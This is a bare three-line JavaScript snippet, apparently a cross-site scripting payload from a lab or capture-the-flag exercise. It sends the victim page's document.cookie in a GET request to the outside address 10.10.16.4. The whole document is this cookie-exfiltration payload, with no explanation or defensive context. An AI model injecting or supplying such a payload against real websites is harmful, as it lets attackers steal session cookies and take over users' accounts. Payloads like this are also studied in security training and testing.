var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.16.4/?test='+document.cookie, true);
request.send();
